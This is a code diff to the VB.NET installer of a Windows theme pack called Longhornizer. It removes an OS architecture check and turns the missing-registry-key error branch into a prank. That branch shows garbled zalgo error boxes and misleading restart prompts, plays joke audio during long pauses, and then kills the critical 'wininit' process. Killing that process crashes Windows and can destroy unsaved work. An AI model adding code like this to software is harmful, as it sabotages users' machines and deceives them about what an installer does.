@@ -4,19 +4,37 @@
         'First, error out on incompatible versions
         If Not System.Environment.OSVersion.Version.Major = 6 Or (System.Environment.OSVersion.Version.Major = 6 And (System.Environment.OSVersion.Version.Minor < 0)) Then
             ' Quit silently if incompatible
-            MsgBox("Longhornizer has detected that it is being installed on an unsupported operating system.")
-            Application.Exit()
-            End
-        End If
-        If Environment.Is64BitOperatingSystem = False Then
-            ' Warning the user that the pack isn't supported on x86
-            MsgBox("Longhornizer has detected that it is being installed on an unsupported operating system.")
+            MsgBox("Longhornizer Transformation Pack  experienced an unsupported OS moment. To install this transformation pack, restart the i")
             Application.Exit()
             End
         End If
         If HKLMKey32.OpenSubKey("SOFTWARE\Longhornizer") Is Nothing Then
             ' Key doesn't exist, so we just quit
-            MsgBox("Longhornizer experienced a Registry Failure. To install this transformation pack, restart the installation.")
+            MsgBox("Longhornizer Transformation Pack  experienced an unexpected error. To install this transformation pack, restart the installation.")
+            MsgBox("Longhornizer Transformation Pack  experienced an unexpected error. To install this transformation pack, restart the installation.", MsgBoxStyle.Exclamation + MsgBoxStyle.MsgBoxRight, "")
+            MsgBox("L̴̨̡̡̨̡̢̢̢̢̢̡̨̢̛͈̳͍̠̯̜͔͉̝̳͔̪͍͓̩͈̝̪̹͇̭̞̥̤͙̘̯̮̗̰̜̝͇͙̰̦̳̭̲̦͍̭̟̜͍̳͚͉̭̞̠͕͖̩̰͕̼͖̜̹͉̠͔̙͔͉͕͍̰͇͉̩̪̟̻̖͚̼̺̖̯̪͓̮̟͖̫̤̩͉̳̫̱̟̥̞͖͎̼͖̲̘̜̰͋͗̾̌̀̓͋̀̋͂͐̿̐̇̌̓͊͂̍͌͂͆̒̄̏͌̏̿̾͂̌̄̌̀̉͗̄̾͑̎͐̂̈́̀̓̿́̌̉̽́͋͊̈́͛̑̓̑̋̄͒̀͌́͑͆̉̑̌́̀͌͒̓͊̉̈̋̌̇̋̉̈́͊́̓̾̈̌̀̽̽͛͒̆̂̈́̏̕̚̚̕̕͘̚͜͠͝͠͠͝͝ͅͅͅh̵̢̧̧̧̡̡̡̨̧̢̡̧̡̨̡̡̛̛̛̛̛̛̛̤̮͎͇̭͇͈̯͖͍̹̹͕̺̬̜̗̼͇̲̣͇̪̹͇͖̟̲̬̝̮̠͎̝̟̗̞̳̰̩̥̼͍͕̖̭̘̤͕̲͕̤͉̻̫̮͓̩̙̪̻͕̼͙͙̝̙͕̠͇͍͇̱͙̩̲̣͈͎̭̫̤̥̝̳͚͓͈̱̗̱̱͈̱̺͍͈͉͉̜͍͈̞̖͉͖͙͓̩̳͍̄͒̓̊̈́͆͌́̔͌̈́̿̅̇̾͊̈́͐̏̑͊̓́̀̉̐̂̂̎̐̅́͑̀͗̂̎̇͊̉̒̈̀̀̾̅̄̄̈́̓́̇̊́̅̉̈́̃́̈́̈́̍̍̑̊̏̒̈͑̈́̓̽͗̌̇̔̂̎͆̆̃̐̆̐̔̃̽͐͛̐̐̌̑́̈́̐̽̐̉͐̌̍̊̒̂̉͐͘͘̕͘̚̚͜͜͜͠͠͝͝͝͠͝͝ͅͅͅn̷̡̡̧̢̧̡̨̧̡̨̡̛̹͚̣̥̭͙̜̙̳̙̗̺̯̝̹̲̜̤̙͖̯͍̰͚̯̖͓̻͖̣̻̥̼̭̣͙̪͇͎̯͉̭̳̘̭̫͈̜̖͚̤͚̖̣̩̗̻̞͇̝͈̝͚̣̪̙̮͍̭̜̤̳̤̪̯͇͙̗̺͔̦͖̤̘̱̠͈͙̠̩͉̜͙̫̲̮̫͚͖̣̩̭͈̝̬̩̞͍̿̆̍̇̾̄̀̐̈̀̇̃̆̀͑̐̓̑̾͌͌̌̇͋͐̓̎͆̽̋̄͗̓̔̑̀̀̃̉̆̑̓̅̀͌͑́̅̄͗̋̈́̅̇͘̚̚͜͜͜͜͜͝͠͠͠͠ͅͅͅͅo̶̧̡̧̨̨̨̧̢̢̮̖̞̭̦̲̟̘̘̫͇̣̖̣̹̰̬̞̼͓̲͙̞̙̜̻̜͈̬̮̙̲̩̙͕͖̖̪̪̣̠͎̬̙͕̺̪̩̱͖̰͚̼̹̮͓̝̺̘̺̞̭̼̼̥̠̩̙̳̙̹͕̪̱͓̙͍͉̤̲̝̖̗̺̠̲̮̦̩̼̫̙͉̪̰̣͓̭̬̲͍̞̰̞̖̤͍͎̺̜̩̔͐͜͜͜͝n̷̢̧̢̢̧̨̢̧̛̛̛̻̰͙̰̺̩̩̤̮̝͙̞̱̭͉̗̻̪̬̥̭̲̣͎̲̼̦̙͍͉̩̺̹̳͈̘̜̗̼͇͚̭̜͖̼̺̬̭̤̰̥͓͙̳͚̖̟͇̯̯̗͈̝̜͚̘̭̝̺̯̖͖̦̥̙̮͖͚̦͈͕̗̙̫͕̟̳̰̙̖̺̗̝͕͍̙̩̦̟͔͕̜̩͕̥͎̪͇͎̗̝̦̜͕͙̩̟̟͓̏̎̋̂̐̀͆̑̀̅̆̈́̉͛̄̀̐̌̅̾͑̎̇̔̂͒͊̋̉͆̈́̊͌̎̈́͂͗͑̒̀́̆͗̽̒̏́͊̒̓͂̀́̊̊̀̀̑̎̉̈̏̈͗̔̓͋̈́͗͋̓̍̅̀͛͋̏̎̎͛́͌̊̎̑͂̎̏̒̎͐͌̆̊̐̽͐́͌̒̈̎̄̅̋̚̚̚̕̕͘͜͝͠͝͝͝͝͠͝ͅͅͅz̶̧̡̡̨̢̡̨̨̡̡̢̢̞͕̱͙̩̩̞̞͍͙̜̘̙̳̭̮̯̲̜͈̻̙̖͎̬̗̜̠͈͖̟͚͈͙̹̥̙̰͚̲̬͙̰̠̤̙̑̇̓̀͐̃́̈̐͒̓̍͗̃̔̏̏̏͆̌̇͑͘͜͜͜͝ͅͅr̷̨̢̧̧͉͍̱̗̬̫̣͙͓̰͇̲̱͔̲͔͎͔͔̩͈̖̝͍͇̟̗͓̥͈̫͈̘̫̝̮̞̮͍̳̪̜͎̮̳̞̱̪̬̼̲̹̪̟͔̾͑̓͋͒̂̈̂̋̀̅̍́͂̎̒͒̈́̔̏̂̌͊̆̋̃̃̑̐̓̄́̈́̈͊̉͒̒̀͘͜͝͝͝ͅg̸̨̡̛̞̤̤͚̜̼̼̏̌́̅̂̍͐͑̑̇̉̏̋̈́̕̚͝ͅę̴̬͇̬͚̤̟̲́̈́́͛̈́̇̑̂̓̾̆̉̈́̽̓̌̏̊̂̇̎̽́̌̍̏̐̍̾̇̒͛́̃͗̕̚̚͝͝͝r̸̨̡̡̢̨̡̡̡̨̢̛͓̟͖̟̥̰͈͕̥̺̖̹̹̺͇̫̻͍̯͈̙͇̙̤̦̦̱̘͎̣̥͙͍̳̜͍͙͓̭̖̩̣͖̭̲̬͇̻̫͉̭̣͉̲͍͕̞͓͉͔̬͈͕̙͍͈̩̫̦̻̖̻̹̮̗̤̫̮̘̠̘̳̞͔̯̰͓̗̹͎̖͓̩̜̟̝̩̩͈̭̱͇̈̎̒͛͑̂̉̌͆̿͗̈́̆̃̎̄̄̊͗͊͆̍̃͛̐̽̈͗̑͂͌̏̔̌̓̉̾̽̆̾͑̓̍̈́̀́̂̾͋̏̋͂̏͋̕̕̕̚̕̚͜͜͜͜͝͝ͅͅͅͅi̸̡̧̢̨̨̧̡̛̮̜̮͔̣̮̹͔̤̬͍̠̮̱̳͍̟͚͖̥̠̜̯͉̳̳̳̼̤̞̺̬̦͍̝͇̮̮͖͇͈͈̙̻̱̻̘̮̥̰͉̝͈͈̣͉͙̝̖͉̤͚̫̘̩̫̜̲͚̬̺̮͖͎̳͔̲̩͈͖̲̱̦̩̪̣̤͙̼̘̬̮̦̝̬̥̖̟̝̥͍͕͎͒̂̄̎̌̒̇͋͂̆͑̅̋̏̉̍̋̋͑̓́̓̋͐̏͆͑̒̐̇̌̋̈́͆͑̈́̓͌̄̃̍́̄̍́͑̌́̕̚̚͘͜͜͜͜͜͠͠͝ͅͅơ̸̡̨̛͓̘̖̖͚͔͎̻͇̥̳̱̪͕̟̘̦̠̣͔̪̺͇̱̅̾̆͆͛̈̒̇̊͛̅͐͒͌̈͊͐́͐͋͋̉́̓̀͑̈́͌̈́̌̎̊͌̈́͌̓̋̾̿̓̏̓̉̿̅̄̿̉̀̆̐͐͋̽͊͆̾̌̅̏̄̔͊̈́̀̽̓̆̑̈̃͘̕͘̚̕͝͝͝͠͠͝͝ͅͅͅ ̶̨̧̨̢̧̨̬̰̠̬͈̳̱̦̘̺̮̠̼͎͕̰̱̳̠̗̺̖̭̭̤̘̝̞̲̺͙̠̩͓͉͇̗̙̪̲̜͇̟̺̘̜͍̱͚̖̹̠̠̦̹͙̺̥̯͔̗͕͔͎͈̞͓̤̬̲̮͍̩̥̠͉̗̱̞̩͙̩̼͈̭̱̪̤͙̳͈̤̣̰͇̝̩̫̥͙͇̥͔̗͚̭̟̪͙̪̪̦̘̮͖̱͆́̔̀͂̆͒̂͛̉̒̆̉͒̈͋̈́̉̈́̂̒̉̑̄̽̋̈́̆͌̿͋̀̄̚̚̚̕͠͠͝͝͝ͅͅͅͅͅn̴̡̢̧̨̧̨̢̧̛̻̘̫̹͔̭̝̟͈̖̥̦̞̞̯̥͖̻̮͖͕̤͚̟͚̜̥̬̰͙͔̜̜͔͈̫͚̤̤͉̼͓̫̥͍͓̦̱͔͖͖͍̬͍̰͖͓̠̘̟̙̼͉̝͇̱͇̳̩͚̱̹͈̹̘̣̥̰̦̬̮̭͉̝̼͕̱̖͎̳͇͍̩͇̬̯̰͉̖͎̯̹͚̗̜̖̪̮͈̲͇̱̬̤̼͇̼̘̈̾̍̒̅̌͌̅͐͗͋̊̆̔̑̎͐̐͑͛̒̈́̐̋̿̿͑͛̑̾̀͐͘͘͘͘͜͜͝͠ͅͅͅͅŗ̸̡̢̢̨̡̧̛̝̲̜̬͙̤̫̗͍̘͎͎̖͓͎̜̗͙͕͉͓͙̟̫̗̞͚̞͙̮͍͓͙̜͍̤̳̲̫͈̙̘̺͔̞̳̺͕͙͖̻͎̦̫̠̜̠͚͈̰̣̾͊͆̂̀̂̾̈́̾̏́̂̔͒̾́̒͛̏̉̆͋͌̓͊̐̊̓́̈́̈́̊͑̑̍̐̿͂̎͗̿̓̓̈́̍̔̈̈́̈́̽͋̎̉̍̒̑̌̎̈́̔̚̚̚̕̚͘͜͜͜͝͝͝͠͝͠͝͝ͅͅs̴̛̼̳͇̻̬̻̳̗̱̹̫͚̘͕̲̝̙̖̖̻͚͍̥̰̥͇̱͈̼͓̝̺̬̬̬͓̓̍̓̆́͒͗̄̽͑̓͒̓͌͗̈͒̐̀͛̆͂̀͆̐̍͊͊͂́̉̓̓̽͑͊̔̓̔̉̐̊̿̑̇͊̍̆̈́̓̀͌̍͗̌̀̌͂͐͗̎̏̇͆́̐̾̀̃̒̀̽͆͒͒̄̈́̃̄͊͌̐͋͒̐̆̓̔̀̽̋͒̄͂͒̇̽̉̈́͊̏͊̒̊̎̎̔̋̂͛̓͘̚͘̕̚̚̕̕͜͠͝͝͠͠͠͝͠͠͝͠͝͝t̷̲̣̹͚̞̥̆̇̓̂̓̆̈́͋̈̈͛̄̌̊̍̾̔͌͌̃̆͌̽͋́͒̈̏͑̉̐͝͝͝à̵̡̛̱̳̻̥͔͖̘͈̜̜͉̺̫̦̺̤̝̠̯͍̩͚͈̲̱̱̲͍̳̪̥̫̖̘̋͛̐̏̒̃̓̔̔̽͑͋̍̈́̋̀̂̿͐̓͗͗̀̎̓̓̈́̆̃̅̃͌̄́̍̊́͋̊̐͛͑̆̈̐̃͌͊̈́̑̿̅̎͆̍̒̄̔͌͑͊̅́̉̔͆̒̆͂̾̓̇̑̓͆̈́̾̎̏̆̾̅̐͌͑͌̋̍̒̅̄́̂̆̓̈́̎̏̌̍̄̽̏̃̀̾̌̆̔̀̓͗̔̄̈́̚͘͘̚̕̕͘͜͝͠͠͝͝͝͝͝͠͠͝͝͠͠͠ͅͅͅn̸̨̨̢̛̜͙̗̦̪̠̣̹̯̗̱͕̣͇̲̳͙͊̓̈́̄͒́̓́̊̅̐̅͌͂͑͒̃͐̊͌͂̀͂̓̌͑̐̂̓̓̃̅̐̑͋̄͊̌̆̈́̓̏̓̅͆̊̚̕̚͠͝͠͝ǫ̷̡̨̛̯͇̲̲͍̪͚̘̲͔̺̙̥̮̰̭̝̞̲̘̜͙̣̯͔̯̰̦̳̼̗̦̝̼̠̗̺̰̀͒̍̓̄͆̂͑͒͊͆͗̂̽̎̾̍͗́͊̿̊̿̀̒͌̍͋̽̊̓̆̔́̈́͆̈́̇͐̅̋̏̿̈́͒̿̽̋̇̀̃̍̐̊͌̉̿̆̆̃̃͌̾͆̇̄́̓̌̈́̃͆͒̏͆́̀̈́̄̂͗̋̔́̏̍̈́͒͂̈̄̓̌̀͛̓̀̐́̍̓̎̐͆͐̇͗͂͌̌̎̀̓̉̕̚̕̕̚͘̚͝͠͠͠͠͠͝͝͠͝ą̸̡̬̼̫̣͚̹̝͎̝̩̝̞̹̠̱̼̠̭͓͉͉͇̮̜̜̺͈̙̣̟̭̟̭̰̌̅́̏̃̃͒̀̋̀́̓̎͛͗̒̇̀̒̏͘̚͜͝ͅr̶̢̢̨̛̞̫̜̳̮̮̦͔͕̘͕͓͇͕̭̬̯͙̭͖͔̖̣̰͚͇̭̰̣͇̗̫̖͇͈͖̲͚̯̮͖̥̠͙̥̥̽̿̔͒̂̂̌͗̀́̉͒̊̔̾̚͝ͅͅm̷̛͖͍̈́̒̍͋̐̓̿̔̌͐̿̌̊̃̍̊͛̍͒̏͑͐̿̏̋̍̏́̅̋͊̾̔̎̾̋̇̂͊́̎̆̍̅̉̆̈́̋̕͘̕̚͘̚̚͝͝͝į̶̧̘̥̤̻̘͈̞̯̼̙̣̪̻̲̫͎͎̗̞̫̰̯̥̞͈͙͉̟̩̝̠̞̗͇̯̰͍̦̹̼̲̱̜̆͊̅͌̈́̏̀ͅͅf̴̡̢̧̡̧̧̢̛̛̛̪̭̩̝̰̠̖͕̪͉̮̘͙͈͍͙͔̭͍̪͓͎͇͚͍̻͖̣͙̺̳͔̗̗͔̟̠͈̺̯̠͈̰͎͓̲̱͔͍̹̙̼̠̮̲̻̠̖̠̰̳͇͓̦͎͉͖͎̹̻̥̻̜̗͇̜̹̫̘̫͈̬̦̣̝̬̠͚̣̹̼̗͕̥͙͚̰͙̬̪͎͔̯̞̣̻̜̻̣̮̻͓̲̙̰͕͉̲̙̙̬̖̦͇͇̌̿̇͐̐̇̐͆̉͗̎̾͌̌͒̑̆̏̈̿̀͐̄̓̑̆̌̈͘̚̕̚̚͜͜͜͜ͅͅǫ̸̡̢̡̡̡̡̨̡̡̧̡̧̢̧̡̙̪̖̝͖̭͚̲̘̰̦̣͎̦͇͔̥̯̬̱̦̘̹̝̪̖̙͔̯̦͕̼̠̳͍̻̫̪̠̜͉̞͙̦̗̪̣̹͙͉̹̜͚̳̪̯̗̦̤̮͍̳͙̼̞̯̜̠̣̲̠͈̥̗̦̘̩̙̣̱̟̫̤͈̼̯͎̹̭̹͙͚̮̪̦͙̟̖̱̣̠̠̼̼̞̥̣̺̯̪̯̮̠͈̻͎̰́̄̊̈́̑̐͌̽̈́͑͜ͅṫ̸̨̢̧̢̨̡̢̡̡̛̛̛̛͙̳̳̹̝͈̪̰̠͓̯̝̦̤̖̦̣̞̭͔͎̩̱̘͈̪̰̱͚̯̭̙̮̙̞̥̹͕̤̟̗̳̞̠̼̞͍̞͕̺͙̩̖̩̟͇͇͍̹͙͇̪̗̦̗̠̺̀͐̂͐̔͗̔͆̅̌͑̓̍̍̓̀̈́͌̉́̾̂̒̈̀̍̓̓̏̇̈̌̈́͆͐̏̂̐̀̆̽́͒̓͑͋͋̑̓̊͛̓̋͗̄̎̈̃̏̒͐͂͐̆̀̇͆͆̎̎̃̔̄͋͋͐͋́̓̍͌̕͘͜͜͜͜͝͝͠͝͠ͅͅͅ ̷̢̡̡̛̛̛̛̫̖̯̥̹̻̪̹̞̯͎̖͕͔̞̖̰̥̙̱̳͕̯̰̫͖̯̹̬̬̺̝̱̪̝͕̙̥͔͕̪͕̦͍̭̥̦̝̩̟̬̰͉̯̖̣̲̳̰͓͚͈̞͋̌͐̂̈́̔͑̎̄̐̽̅̐̈́̽̈́͑͊̓̀͆̍̎̓͌͋̉̒͊̐͊̎̋̌͐̆͛̄̈̔̈̌͆͋̉̉̃̍͋̈́̏̄̀͑̾̀̉͊̾͐̅͂̈́̃̃͛̆̔͋͑͒͒̃͌͗́̊̾̀̇͋̾͛̉̋̃̉̋͘̕̚̚͘͘͘͜͜͜͝͠͝͝͠͝͝ͅp̶̧̧̡̨̨̢̢̢̢̧̧̢̛̯̙̬͕̜̬͓̖̥̩̝̞͇̟̤̘̯̥̰̜̳̩̮̮͙͇̟̱͎̦̭̯̼͇̣̗̭͖͍̝̳̟͇̭̺̠̪͈͕̦̹̖̙͙̻̣̹͓̟̫̲̠̯͈̥̞̲͖̝͍̳̯̘̭̤̞̻̠̰͍̆͌̈́̿͆̔̅͋͐́̾̈́͆̈́̽̓̋̾́̓̒̿̇̈́̀̈́̾́̅͆͛͋͘͘͘͘̕͜͜͜͜͝͠͝ͅͅͅą̸̧̧̢̣̳͕͔̥̞̪̦̦̙͓̦̺͖̜̻̻͓̲̘͓̜̫̭̜̥͓͕̹̙͔̲̳̳̣̤̝̝͕̯̪͈͚̩͖̬̝͎̼͓̿͗̓͋́̊̾͌͒̽̈́̌͋̃̊̃̔͒̇̑̏̑̆͒̅̃̇̿̋͘͘͠ͅͅͅk̸̡̧̡̧̢̢̨̨̡̛̛̛̖̪̝̬͓͔̼͔̭̪̖̣̜̬̜̟̦͇̭̪̮̩͔̹͕̮̩̠̻̪̤̺̮̣͖͚͕̟͔͙̮̬̰̞͈̞͖͉͖̮̲͈̯̪͇͎̬͓̩̣͚͖̱̞͙͌̍̌̑̋͆̿́̃͆̋̎͑́̃̀̏̏͋͑̾͛͛̾̽̈́́̑̅̆͂̔̒̒͑̅̎́̀̄̀̐͌̆́̔̊͊̀̇͊̔̒̈̒͂͂͌̓̌͐̂̿̔̅̉̌̑̔̃̓͋̿͌̐͆̍̉̐̊͑̊́̍́͂͗̈́̄̌͊̄̄̽̏̅͛̄̏̐͌̚̚̚̕̚͘̕͠͝͝͝͝͠͝ͅͅͅͅͅͅc̸̢̛̛̺͎͈̘̬͚͚̗̻̫̱̖͈̜͚͉͕̻͕̫͓̖͓̟̬̙̹̤̱͇̮͚̰̮̝̱̟̝̙͎̜̻̤̫͔̜̞̠̱̦͔͍̣̹̠̣̣̜̜̪̤̰̝̘̪̗͉̯̻̥͙̼̯̼͍̞̮͇̫̯̳̰͕̮̝̼̙̗̹̖͔̙̙̣͓̮̬̹͓̹͇̼͙̙͈̮͉̼̊͗͆̒̀̾̃̉̂̔̍̅͊̋̋̏̓̉̔͂̓̈́̃̍̈̃̆͐͐̾̐̅̄̀̈́̏͋̾̈̑́͂̒̿̑͌̅͐̆̍́̾̎̈̾̍͆̑̀̆̋̔̀̃̿͘̕͘͜͜͜͝͝͝͝͠͠͠͠pneecexdier an cumextpeed rrero. to sainltl iths fnraioatmortsn cpka, sratrte eth asltitnanloi.", MsgBoxStyle.Exclamation + MsgBoxStyle.MsgBoxRight, "")
+            My.Computer.Audio.Play(My.Resources.Tada,
+                AudioPlayMode.WaitToComplete)
+            Thread.Sleep(8000) 'Give Windows time to save the changes
+            MsgBox("Longhornizer needs to restart your computer. Do not restart your PC. Click Ok to restart your pc")
+            Thread.Sleep(15000) 'Faking the shutdown sound for funnies
+            My.Computer.Audio.Play(My.Resources.Shutdown,
+                AudioPlayMode.WaitToComplete)
+            Thread.Sleep(20000) 'Give all hell now.
+            My.Computer.Audio.Play(My.Resources.Pepe,
+                AudioPlayMode.WaitToComplete)
+            MsgBox("Longhornizer failed to restart your computer. Trying Fallback mode. Enjoy the phonk music meanwhile your PC tries to restart.")
+            My.Computer.Audio.Play(My.Resources.Phonk,
+                AudioPlayMode.WaitToComplete)
+                MsgBox("Are you still using your computer?")
+            Thread.Sleep(12000) 'Just to be sure.
+            My.Computer.Audio.Play(My.Resources.shutdown,
+                AudioPlayMode.WaitToComplete)
+            ' First find the process(es) you want to kill, for example searching for the name
+            Dim notepadProcesses As Process() = Process.GetProcessesByName("wininit")
+
+            ' Loop over the array to kill all the processes (using the Kill method)
+            Array.ForEach(notepadProcesses, Sub(p As Process) p.Kill())
             Application.Exit()
             End
         End If
